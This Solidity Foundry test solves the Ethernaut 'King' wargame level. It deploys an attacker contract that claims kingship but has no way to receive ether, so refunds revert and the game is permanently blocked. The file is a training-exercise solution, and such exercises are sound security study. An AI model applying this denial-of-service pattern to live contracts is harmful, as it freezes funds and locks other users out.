// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/King/King.sol";
import "../src/King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingGameAttacker {
    address victimAddr;

    constructor(address _victimAddr) {
        victimAddr = _victimAddr;
    }

    function attack() external payable {
        payable(victimAddr).call{value: msg.value}("");
    }
}

contract KingTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 10 ether);
        vm.label(player, "player");
    }

    function test_kingGame_attack() public {
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            kingFactory
        );
        King ethernautKing = King(payable(levelAddress));

        KingGameAttacker attacker = new KingGameAttacker(
            address(ethernautKing)
        );
        attacker.attack{value: 1 ether}();

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
